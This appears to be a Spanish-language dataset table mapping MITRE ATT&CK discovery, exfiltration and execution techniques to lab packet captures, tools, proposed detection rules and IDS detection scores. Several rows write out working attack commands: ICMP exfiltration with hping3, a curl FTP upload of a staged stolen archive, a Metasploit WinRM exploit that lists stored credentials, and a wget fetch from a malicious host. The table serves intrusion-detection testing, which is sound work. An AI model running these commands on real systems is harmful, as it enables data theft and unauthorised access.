Discovery;-;TA0007;Domain Trust Discovery;T1482;-;-;Descubrimiento de dominios de confianza en entorno Active Directory;dsquery;T1482-Domain_trust_discovery_[4].pcapng;;1;0;NO*;"""Regla personalizada que detecte paquetes LDAP, procedentes de equipos que no son DC en la red (configurable manualmente) y con la cadena objectClass=trustedDomain""";-;Manual [4] / 3.13;Manual [4] / B.13;Manual [4] / 4.13;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Exfiltration;-;TA0010;Exfiltration Over Alternative Protocol;T1048;Exfiltration Over Unencrypted Non-C2 Protocol;T1048.003;Exfiltración por ICMP;hping3;T1048.003-Exfiltration_over_ICMP_[2].pcapng;;16;0;SI;Regla genérica que detecte PING inusual.;"""Exfiltracion mediante protocolo ICMP. Envia varios echo Request que contienen como datos el contenido de ese fichero. Comando: echo ""Esto es un exfiltración sobre ICMP"" > file;timeout 15s hping3 --file ./file --data 36 192.168.2.2 --icmp""";Manual [2] / 3.2.2.1;Manual [4] / B.27;Manual [2] / 4.2.2.2;1;1;0;1;0;1;16;1.00;16;1.00;16;1.00;16;1.00;El mismo mensaje ICMP es enviado varias veces repetido. Snort detecta el envio inusual de PING (SID 29456);0;0.00;1
Exfiltration;-;TA0010;Exfiltration Over Alternative Protocol;T1048;Exfiltration Over Unencrypted Non-C2 Protocol;T1048.003;Exfiltración por FTP;Caldera;T1048.003-Exfiltration_over_FTP_[3].pcapng;;1;0;NO;-;"""Exfiltracion de datos utilizando el protocolo FTP. Utilizando caldera y la operacion Advanced Thief. Comando: curl -T stage_to_steal.tar.gz.gpg ftp://172.16.1.2/VictimDirectory/ --user ""dit:dit""""";Manual [3] / 3.8.15;Manual [3] / 3.8.15.4;Manual [3] / 3.8.15.5;1;1;0;1;0;0;0;0.00;0;0.00;0;0.00;1;1.00;-;0;0.00;0
Exfiltration;-;TA0010;Exfiltration Over Other Network Medium;T1011;Exfiltration Over Bluetooth;T1011.001;Extracción via Bluetooth;"""Covenant, btobex, Bluetooth""";T1011-Exfiltration_over_bluetooth_[4].pcapng;;1;0;NO;Detección por anomalías en red Bluetooth. Envío y/o recepción de información comprometida por la red Bluetooth;-;Manual [4] / 3.23;Manual [4] / B.23;Manual [4] / 4.23;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Exfiltration;-;TA0010;Automated Exfiltration;T1020;Traffic Duplication;T1020.001;Ejecución de script en Python para activar el reenvío de paquetes en el equipo víctima;"""SSH, Scapy""";T1020.001-Automated_exfiltration_traffic_duplication_[4].pcapng;;1;0;NO;Detección por anomalías en red que detecte el envío duplicado de paquetes procedentes de un mismo origen interno a la organización;-;Manual [4] / 3.24;Manual [4] / B.24;Manual [4] / 4.24;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Exfiltration;-;TA0010;Scheduled Transfer;T1029;-;-;Comunicación C2 para el establecimiento de extracción programada;"""Covenant, Powershell""";T1029-Scheduled_transfer_[4].pcapng;;1;1;NO;"""Detección por anomalías, basada en el descubrimiento de eventos programados que no han sido creados por el usuario.""";-;Manual [4] / 3.25;Manual [4] / B.25;Manual [4] / 4.25;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Exfiltration;-;TA0010;Data Transfer Size Limits;T1030;-;-;Dividir archivos para realizar transferencias menores a un umbral que provoque alertas;"""ftp, split""";T1030-Transfer_Size_Limits_[5].pcapng;;1;0;NO**;"""Dependiendo la forma en la que se envien los archivos, puede ser indetectable. Sin embargo, si utiliza protocolos de transferencia de ficheros (FTP,SMB...) resulta importante monitorizar transferencias con un mismo tamaño de manera concurrente""";"""Transferencia de ficheros mediante FTP, previamente divididos en paquetes de un tamaño constante""";Manual [5] / 3.5.9.1;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Exfiltration;-;TA0010;Transfer Data to Cloud Account;T1537;-;-;Transferir archivos de una cuenta a otra mediante un servicio en la nube;OneDrive;T1537-Transfer_Data_to_Cloud_Account_[5].pcapng;;1;0;NO;Deteccion por listas negras/anomalías;Transferir entre dos cuentas en la nube unos ficheros;Manual [5] / 3.5.9.2;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Exfiltration;-;TA0010;Exfiltration Over C2 Channel;T1041;-;-;Exfiltración por canal C2;Caldera;T1041-exfiltration_over_c2_channel_[3].pcapng;;1;0;NO;Detección por anomalías basada en la sospecha de una extracción de información confidencial por un posible canal C2;-;Manual [3] / 3.8.14;Manual [3] / 3.8.14.4;Manual [3] / 3.8.14.5;1;1;0;1;0;0;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Exfiltration;-;TA0010;Exfiltration over Web Service;T1567;Exfiltration to Cloud Storage;T1567.002;Exfiltrar datos de un equipo a la nube;Google Drive;T1567.002-Exfiltration_To_Cloud_Storage_[5].pcapng;;1;0;NO;Deteccion por listas negras/anomalías;Transferir ficheros de un equipo a la nube;Manual [5] / 3.5.9.3;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Execution;-;TA0002;User Execution;T1204;Malicious Link;T1204.001;Enlace malicioso;wget;T1204.001-malicious_link_[3].pcapng;;1;0;NO;Deteccion por listas negras/anomalías;Redireccion al pinchar en un enlace a un sitio malicioso. Comando : wget http://172.16.1.2 (Desde la víctima);Manual [3] / 3.8.17;Manual [3] / 3.8.17.4;Manual [3] / 3.8.17.5;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Execution;-;TA0002;Windows Management Instrumentation;T1047;-;-;Ejecución de carga por WinRM;Metasploit;T1047-WinRM_[2].pcapng;;1;0;SI;Regla genérica que detecte intento de ejecucion de código shell en un equipo;"""Ejecucion de payload en un equipo mediante WinRM. Comando: msfconsole -x ""use exploit/windows/winrm/winrm_script_exec; set RHOSTS 192.168.2.2; set LHOST 192.168.1.3; set LPORT 5555; set username administrator; set password vagrant; set force_vbs true; run -z; sessions -c 'cmdkey /list'; sessions -k 1; exit""""";Manual [2] / 3.1.4.1;Manual [4] / B.26;Manual [2] / 4.2.1.5;1;1;0;1;0;1;1;1.00;1;1.00;1;1.00;1;1.00;-;0;0.00;1
Execution;-;TA0002;Exploitation for Client Execution;T1203;-;-;Ataque con Botnet;"""Ares, Screenshot and key logging""";T1203-C2018_[6].pcapng;;1;0;NO;-;-;Dataset CIC-2018;Dataset CIC-2018;Manual [4] / B.35;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Execution;-;TA0002;System Services;T1569;Service Execution;T1569.002;Ejecución de un Servicio / Fichero Ejecutable de manera remota;PsExec;T1569-System_services_service_execution_[4].pcapng;;1;0;SI;"""Existen múltiples métodos de detección. Como ejemplos:
 Regla que detecte la cadena “PSEXESVC” en el contenido de mensajes SMBv2
 Regla que detecte archivos ejecutables en mensajes SMB
""";-;Manual [4] / 3.6;Manual [4] / B.6;Manual [4] / 4.6;1;1;0;1;0;1;0;0.00;1;1.00;1;1.00;1;1.00;-;0;0.00;1
